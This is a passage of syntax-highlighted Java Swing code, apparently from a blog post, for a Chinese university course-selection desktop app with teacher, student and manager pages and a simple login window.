class="string">&quot;teacher_score_page&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuDeselected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuCanceled</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        menu_cards.add(<span class="string">&quot;teacher_menuBar&quot;</span>,teacher_menuBar);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//manager_cards manager_init_page</span></span><br><span class="line">        teacher_init_page.add(teacher_jl_init);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//manager_cards manager_new_course_page</span></span><br><span class="line">        teacher_score_page.setLayout(<span class="keyword">new</span> <span class="title class_">BorderLayout</span>());</span><br><span class="line">        teacher_view_course.addActionListener(<span class="keyword">new</span> <span class="title class_">ActionListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">                <span class="type">Teacher</span> <span class="variable">t</span> <span class="operator">=</span> (Teacher) user;</span><br><span class="line">                reloadScoreTea(t, (<span class="type">int</span>)teacher_jc_course.getSelectedItem());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        teacher_info_course.addActionListener(<span class="keyword">new</span> <span class="title class_">ActionListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">                <span class="type">Teacher</span> <span class="variable">t</span> <span class="operator">=</span> (Teacher) user;</span><br><span class="line">                t.getCourseInfo((<span class="type">int</span>)teacher_jc_course.getSelectedItem());</span><br><span class="line">                JOptionPane.showMessageDialog(<span class="literal">null</span>, <span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>+<span class="string">&quot;课程编号: &quot;</span>+t.getCourseInfo((<span class="type">int</span>)teacher_jc_course.getSelectedItem()).get(<span class="number">1</span>)</span><br><span class="line">                        +<span class="string">&quot;&lt;br&gt;&quot;</span>+<span class="string">&quot;课程名称: &quot;</span>+t.getCourseInfo((<span class="type">int</span>)teacher_jc_course.getSelectedItem()).get(<span class="number">0</span>)</span><br><span class="line">                        +<span class="string">&quot;&lt;br&gt;&quot;</span>+<span class="string">&quot;课程信息: &quot;</span>+t.getCourseInfo((<span class="type">int</span>)teacher_jc_course.getSelectedItem()).get(<span class="number">2</span>)+<span class="string">&quot;&lt;body&gt;&lt;/html&gt;&quot;</span>);<span class="comment">//t.getCourseInfo((int)teacher_jc_course.getSelectedItem()).toString()</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        teacher_score.addActionListener(<span class="keyword">new</span> <span class="title class_">ActionListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">                <span class="type">Teacher</span> <span class="variable">t</span> <span class="operator">=</span> (Teacher) user;</span><br><span class="line">                t.scoreStuCourse((<span class="type">int</span>)((List)teacher_score_jl.getSelectedValue()).get(<span class="number">0</span>), (<span class="type">int</span>)((List)teacher_score_jl.getSelectedValue()).get(<span class="number">1</span>), Integer.parseInt(teacher_jt_score.getText()));</span><br><span class="line">                reloadScoreTea(t, (<span class="type">int</span>)teacher_jc_course.getSelectedItem());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        teacher_score_north.setLayout(<span class="keyword">new</span> <span class="title class_">BorderLayout</span>());</span><br><span class="line">                </span><br><span class="line">        teacher_score_north_course.setLayout(<span class="keyword">new</span> <span class="title class_">GridLayout</span>(<span class="number">2</span>,<span class="number">2</span>));</span><br><span class="line">        teacher_score_north_course.add(teacher_jl_1);</span><br><span class="line">        teacher_score_north_course.add(teacher_jc_course);</span><br><span class="line">        teacher_score_north_course.add(teacher_view_course);</span><br><span class="line">        teacher_score_north_course.add(teacher_info_course);</span><br><span class="line">        teacher_score_south.setLayout(<span class="keyword">new</span> <span class="title class_">GridLayout</span>(<span class="number">1</span>,<span class="number">0</span>));</span><br><span class="line">        teacher_score_south.add(teacher_jt_score);</span><br><span class="line">        teacher_score_south.add(teacher_score);</span><br><span class="line">        </span><br><span class="line">        teacher_score_north.add(<span class="string">&quot;North&quot;</span>,teacher_jl_0);</span><br><span class="line">        teacher_score_north.add(<span class="string">&quot;Center&quot;</span>,teacher_score_north_course);</span><br><span class="line">        teacher_score_page.add(<span class="string">&quot;North&quot;</span>,teacher_score_north);</span><br><span class="line">        teacher_score_page.add(<span class="string">&quot;Center&quot;</span>,teacher_score_jsp);</span><br><span class="line">        teacher_score_page.add(<span class="string">&quot;South&quot;</span>,teacher_score_south);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        teacher_cards.setLayout(teacher_c_layout);</span><br><span class="line">        teacher_cards.add(<span class="string">&quot;teacher_init_page&quot;</span>,teacher_init_page);</span><br><span class="line">        teacher_cards.add(<span class="string">&quot;teacher_score_page&quot;</span>,teacher_score_page);</span><br><span class="line"></span><br><span class="line">        content_cards.add(<span class="string">&quot;teacher_cards&quot;</span>,teacher_cards);   </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initStudentPage</span><span class="params">()</span> &#123;</span><br><span class="line">        student_select_course_jl.setCellRenderer(<span class="keyword">new</span> <span class="title class_">CourseSelCellRenderer</span>());</span><br><span class="line">        student_delect_course_jl.setCellRenderer(<span class="keyword">new</span> <span class="title class_">CourseDelCellRenderer</span>());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//student_cards student_menuBar</span></span><br><span class="line">        student_menuBar.add(student_menu_select_course);</span><br><span class="line">        student_menuBar.add(student_menu_delect_course);</span><br><span class="line">        student_menu_select_course.addMenuListener(<span class="keyword">new</span> <span class="title class_">MenuListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuSelected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                reloadCourseStuNotSelectedList((Student) user);</span><br><span class="line">                student_c_layout.show(student_cards, <span class="string">&quot;student_select_course_page&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuDeselected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuCanceled</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        student_menu_delect_course.addMenuListener(<span class="keyword">new</span> <span class="title class_">MenuListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuSelected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                reloadScoreStuList((Student) user);</span><br><span class="line">                student_c_layout.show(student_cards, <span class="string">&quot;student_delect_course_page&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuDeselected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuCanceled</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        student_menu_view_course.addMenuListener(<span class="keyword">new</span> <span class="title class_">MenuListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuSelected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                student_c_layout.show(student_cards, <span class="string">&quot;student_view_course_page&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuDeselected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuCanceled</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        menu_cards.add(<span class="string">&quot;student_menuBar&quot;</span>,student_menuBar);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//student_cards student_init_page</span></span><br><span class="line">        student_init_page.add(student_jl_init);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//student_cards student_select_course_page</span></span><br><span class="line">        student_select_course_page.setLayout(<span class="keyword">new</span> <span class="title class_">BorderLayout</span>());</span><br><span class="line">        student_select_course.addActionListener(<span class="keyword">new</span> <span class="title class_">ActionListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">                <span class="type">Student</span> <span class="variable">s</span> <span class="operator">=</span> (Student)user;</span><br><span class="line">                HashMap&lt;Integer, List&gt; stu_not_course = s.getCourseStuNotSelected();</span><br><span class="line">                s.selStuCourse(((Entry&lt;Integer, List&gt;)student_select_course_jl.getSelectedValue()).getKey());</span><br><span class="line">                reloadCourseStuNotSelectedList(s);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//student_cards student_delect_course_page</span></span><br><span class="line">        student_delect_course_page.setLayout(<span class="keyword">new</span> <span class="title class_">BorderLayout</span>());</span><br><span class="line">        student_delect_course.addActionListener(<span class="keyword">new</span> <span class="title class_">ActionListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">                <span class="type">Student</span> <span class="variable">s</span> <span class="operator">=</span> (Student)user;</span><br><span class="line">                s.delStuCourse((<span class="type">int</span>)((List)student_delect_course_jl.getSelectedValue()).get(<span class="number">1</span>));</span><br><span class="line">                reloadScoreStuList(s);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        student_select_course_page.add(<span class="string">&quot;North&quot;</span>,student_jl_0_0);</span><br><span class="line">        student_select_course_page.add(<span class="string">&quot;Center&quot;</span>,student_select_course_jsp);</span><br><span class="line">        student_select_course_page.add(<span class="string">&quot;South&quot;</span>,student_select_course);</span><br><span class="line">        </span><br><span class="line">        student_delect_course_page.add(<span class="string">&quot;North&quot;</span>,student_jl_0_1);</span><br><span class="line">        student_delect_course_page.add(<span class="string">&quot;Center&quot;</span>,student_delect_course_jsp);</span><br><span class="line">        student_delect_course_page.add(<span class="string">&quot;South&quot;</span>,student_delect_course);</span><br><span class="line">        </span><br><span class="line">        student_view_score_page.add(student_jl_0_2);</span><br><span class="line"></span><br><span class="line">        student_cards.setLayout(student_c_layout);</span><br><span class="line">        student_cards.add(<span class="string">&quot;student_init_page&quot;</span>,student_init_page);</span><br><span class="line">        student_cards.add(<span class="string">&quot;student_select_course_page&quot;</span>,student_select_course_page);</span><br><span class="line">        student_cards.add(<span class="string">&quot;student_delect_course_page&quot;</span>,student_delect_course_page);</span><br><span class="line"></span><br><span class="line">        content_cards.add(<span class="string">&quot;student_cards&quot;</span>,student_cards);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initManagerPage</span><span class="params">()</span> &#123;</span><br><span class="line">        manager_jc_teacher.setRenderer(<span class="keyword">new</span> <span class="title class_">TeaCellRenderer</span>());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//manager_cards manager_menuBar</span></span><br><span class="line">        manager_menuBar.add(manager_menu);</span><br><span class="line">        manager_menu.addMenuListener(<span class="keyword">new</span> <span class="title class_">MenuListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuSelected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                manager_c_layout.show(manager_cards, <span class="string">&quot;manager_new_course_page&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuDeselected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuCanceled</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        menu_cards.add(<span class="string">&quot;manager_menuBar&quot;</span>,manager_menuBar);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//manager_cards manager_init_page</span></span><br><span class="line">        manager_init_page.add(manager_jl_init);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//manager_cards manager_new_course_page</span></span><br><span class="line">        manager_new_course_page.setLayout(<span class="keyword">new</span> <span class="title class_">GridLayout</span>(<span class="number">0</span>,<span class="number">1</span>));</span><br><span class="line">        manager_new_course.addActionListener(<span class="keyword">new</span> <span class="title class_">ActionListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">                Entry&lt;Integer,String&gt; t = (Entry&lt;Integer, String&gt;) manager_jc_teacher.getSelectedItem();</span><br><span class="line">                <span class="type">Manager</span> <span class="variable">m</span> <span class="operator">=</span> (Manager)user;</span><br><span class="line">                m.newCourse(manager_jt_course_name.getText(), t.getKey(), manager_jt_course_info.getText());</span><br><span class="line">                manager_jt_course_name.setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">                manager_jt_course_info.setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">                JOptionPane.showMessageDialog(<span class="literal">null</span>, <span class="string">&quot;课程添加成功！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        manager_new_course_page.add(manager_jl_0);</span><br><span class="line">        manager_new_course_page.add(manager_jl_1);</span><br><span class="line">        manager_new_course_page.add(manager_jt_course_name);</span><br><span class="line">        manager_new_course_page.add(manager_jl_2);</span><br><span class="line">        manager_new_course_page.add(manager_jc_teacher);</span><br><span class="line">        manager_new_course_page.add(manager_jl_3);</span><br><span class="line">        manager_new_course_page.add(manager_jt_course_info);</span><br><span class="line">        manager_new_course_page.add(manager_new_course);</span><br><span class="line"></span><br><span class="line">        manager_cards.setLayout(manager_c_layout);</span><br><span class="line">        manager_cards.add(<span class="string">&quot;manager_init_page&quot;</span>,manager_init_page);</span><br><span class="line">        manager_cards.add(<span class="string">&quot;manager_new_course_page&quot;</span>,manager_new_course_page);</span><br><span class="line"></span><br><span class="line">        content_cards.add(<span class="string">&quot;manager_cards&quot;</span>,manager_cards);   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置当前用户，由登录界面调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUser</span><span class="params">(User user)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.user = user;</span><br><span class="line">        <span class="keyword">if</span>(user.getType()==<span class="number">0</span>) &#123;</span><br><span class="line">            setTeacherList();</span><br><span class="line">            manager_jl_0.setText(<span class="string">&quot;管理员:&quot;</span>+user.getUsername()+<span class="string">&quot; 编号:&quot;</span>+user.getUserId());</span><br><span class="line">            manager_jl_init.setText(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>+<span class="string">&quot;欢迎来到选课系统&lt;br&gt;&quot;</span>+<span class="string">&quot;管理员:&quot;</span>+user.getUsername()+<span class="string">&quot; 编号:&quot;</span>+user.getUserId()+<span class="string">&quot;&lt;br&gt;请选择功能&quot;</span>+<span class="string">&quot;&lt;body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">            content_c_layout.show(content_cards, <span class="string">&quot;manager_cards&quot;</span>);</span><br><span class="line">            menu_c_layout.show(menu_cards, <span class="string">&quot;manager_menuBar&quot;</span>);</span><br><span class="line">            manager_c_layout.show(manager_cards, <span class="string">&quot;manager_init_page&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(user.getType()==<span class="number">1</span>) &#123;</span><br><span class="line">            setTeacherList_course();</span><br><span class="line">            teacher_jl_0.setText(<span class="string">&quot;教师: &quot;</span>+user.getUsername()+<span class="string">&quot;  编号:&quot;</span>+user.getUserId());</span><br><span class="line">            teacher_jl_init.setText(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>+<span class="string">&quot;欢迎来到选课系统&lt;br&gt;&quot;</span>+<span class="string">&quot;教师: &quot;</span>+user.getUsername()+<span class="string">&quot;  编号:&quot;</span>+user.getUserId()+<span class="string">&quot;&lt;br&gt;请选择功能&quot;</span>+<span class="string">&quot;&lt;body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">            content_c_layout.show(content_cards, <span class="string">&quot;teacher_cards&quot;</span>);</span><br><span class="line">            menu_c_layout.show(menu_cards, <span class="string">&quot;teacher_menuBar&quot;</span>);</span><br><span class="line">            teacher_c_layout.show(teacher_cards, <span class="string">&quot;teacher_init_page&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(user.getType()==<span class="number">2</span>) &#123;</span><br><span class="line">            student_jl_0_0.setText(<span class="string">&quot;学生姓名:&quot;</span>+user.getUsername()+<span class="string">&quot;  编号:&quot;</span>+user.getUserId());</span><br><span class="line">            student_jl_0_1.setText(<span class="string">&quot;学生姓名:&quot;</span>+user.getUsername()+<span class="string">&quot;  编号:&quot;</span>+user.getUserId());</span><br><span class="line">            student_jl_0_2.setText(<span class="string">&quot;学生姓名:&quot;</span>+user.getUsername()+<span class="string">&quot;  编号:&quot;</span>+user.getUserId());</span><br><span class="line">            student_jl_init.setText(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>+<span class="string">&quot;欢迎来到选课系统&lt;br&gt;&quot;</span>+<span class="string">&quot;学生: &quot;</span>+user.getUsername()+<span class="string">&quot;    编号: &quot;</span>+user.getUserId()+<span class="string">&quot;&lt;br&gt;请选择功能&quot;</span>+<span class="string">&quot;&lt;body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            content_c_layout.show(content_cards, <span class="string">&quot;student_cards&quot;</span>);</span><br><span class="line">            menu_c_layout.show(menu_cards, <span class="string">&quot;student_menuBar&quot;</span>);</span><br><span class="line">            student_c_layout.show(student_cards, <span class="string">&quot;student_init_page&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTeacherList</span><span class="params">()</span> &#123;</span><br><span class="line">        manager_jc_teacher.removeAllItems();</span><br><span class="line">        HashMap&lt;Integer, String&gt; teacher = db.getTeacher();</span><br><span class="line">        <span class="keyword">for</span>(Entry&lt;Integer, String&gt; entry:teacher.entrySet()) &#123;</span><br><span class="line">            manager_jc_teacher.addItem(entry);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//更新教师界面中选中课程的选课信息</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reloadScoreTea</span><span class="params">(Teacher t, <span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        teacher_score_dlm.clear();</span><br><span class="line">        ArrayList&lt;List&gt; teacher_course = t.getScoreTeacher(course_id);</span><br><span class="line">        <span class="keyword">for</span>(List l:teacher_course) &#123;</span><br><span class="line">            teacher_score_dlm.addElement(l);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTeacherList_course</span><span class="params">()</span> &#123;</span><br><span class="line">        teacher_jc_course.removeAllItems();</span><br><span class="line">        List&lt;Integer&gt; teacher_course = db.getTeacherCourse(user.getUserId());</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> l:teacher_course) &#123;</span><br><span class="line">            teacher_jc_course.addItem(l);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 更新学生界面中学生可选课程列表</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reloadCourseStuNotSelectedList</span><span class="params">(Student s)</span> &#123;</span><br><span class="line">        student_select_course_dlm.clear();</span><br><span class="line">    </span><br><span class="line">        HashMap&lt;Integer, List&gt; course = s.getCourseStuNotSelected();</span><br><span class="line">        <span class="keyword">for</span>(Entry&lt;Integer, List&gt; entry:course.entrySet()) &#123;</span><br><span class="line">            student_select_course_dlm.addElement(entry);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 更新学生界面中学生已选课程列表</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reloadScoreStuList</span><span class="params">(Student s)</span> &#123;</span><br><span class="line">        student_delect_course_dlm.clear();</span><br><span class="line">        ArrayList&lt;List&gt; student_score = s.getScoreStu();</span><br><span class="line">        <span class="keyword">for</span>(List l:student_score) &#123;</span><br><span class="line">            student_delect_course_dlm.addElement(l);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initFrame</span><span class="params">(LoginFrame login_frame)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.login_frame = login_frame;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 清空该用户信息。退出界面时调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clear</span><span class="params">()</span> &#123;</span><br><span class="line">        teacher_score_dlm.clear();</span><br><span class="line">        manager_jt_course_name.setText(<span class="literal">null</span>);</span><br><span class="line">        manager_jt_course_info.setText(<span class="literal">null</span>);</span><br><span class="line">        teacher_jt_score.setText(<span class="literal">null</span>);</span><br><span class="line">        user = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LoginFrame</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> MainFrame manager_frame;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JTextField</span> <span class="variable">tf_user</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">JTextField</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPasswordField</span> <span class="variable">tf_pwd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPasswordField</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JButton</span> <span class="variable">login</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;登录&quot;</span>);      <span class="comment">// 用户登录</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">jl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">jl_login</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> Database db;</span><br><span class="line">    <span class="keyword">private</span> Teach teach;</span><br><span class="line">    <span class="keyword">private</span> User u;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LoginFrame</span><span class="params">(Database db, Teach teach)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="string">&quot;选课系统登录&quot;</span>);        </span><br><span class="line">        setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">        <span class="built_in">this</span>.db = db;</span><br><span class="line">        <span class="built_in">this</span>.teach = teach;</span><br><span class="line">        setLayout(<span class="keyword">new</span> <span class="title class_">GridLayout</span>(<span class="number">0</span>,<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        setLocation(<span class="number">800</span>,<span class="number">400</span>);</span><br><span class="line">        setSize(<span class="number">250</span>,<span class="number">200</span>);</span><br><span class="line">        login.addActionListener(<span class="keyword">new</span> <span class="title class_">ActionListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">                <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> verifyUser(tf_user.getText(), String.valueOf(tf_pwd.getPassword()));</span><br><span class="line">                <span class="keyword">if</span>(user==<span class="literal">null</span>) &#123;</span><br><span class="line">                    jl.setText(<span class="string">&quot;user or pwd error&quot;</span>); </span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    tf_user.setText(<span class="literal">null</span>);</span><br><span class="line">                    tf_pwd.setText(<span class="literal">null</span>);</span><br><span class="line">                    setVisible(<span class="literal">false</span>);</span><br><span class="line">                    manager_frame.setUser(user);</span><br><span class="line">                    manager_frame.setVisible(<span class="literal">true</span>);</span><br><span class="line">                    jl.setText(<span class="literal">null</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;);</span><br><span class="line">        add(tf_user);</span><br><span class="line">        add(tf_pwd);</span><br><span class="line">        add(login);</span><br><span class="line">        add(jl);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initFrame</span><span class="params">(MainFrame manager_frame)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.manager_frame = manager_frame;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 验证用户名密码。如果正确，返回用户对象；如果错误，返回null</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">verifyUser</span><span class="params">(String user, String pwd)</span> &#123;</span><br><span class="line">        <span class="type">List</span> <span class="variable">account</span> <span class="operator">=</span> db.getAccount(user);</span><br><span class="line">        u = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(account == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(pwd.compareTo((String)account.get(<span class="number">0</span>))==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="type">int</span>)account.get(<span class="number">1</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                u = <span class="keyword">new</span> <span class="title class_">Manager</span>(user, pwd, (<span class="type">int</span>)account.get(<span class="number">1</span>),(<span class="type">int</span>)account.get(<span class="number">2</span>),(String)account.get(<span class="number">3</span>), teach);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>((<span class="type">int</span>)account.get(<span class="number">1</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">                u = <span class="keyword">new</span> <span class="title class_">Teacher</span>(user, pwd, (<span class="type">int</span>)account.get(<span class="number">1</span>),(<span class="type">int</span>)account.get(<span class="number">2</span>),(String)account.get(<span class="number">3</span>), teach);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>((<span class="type">int</span>)account.get(<span class="number">1</span>) == <span class="number">2</span>) &#123;</span><br><span class="line">                u = <span class="keyword">new</span> <span class="title class_">Student</span>(user, pwd, (<span class="type">int</span>)account.get(<span class="number">1</span>),(<span class="type">int</span>)account.get(<span class="number">2</span>),(String)account.get(<span class="number">3</span>), teach);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> u;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 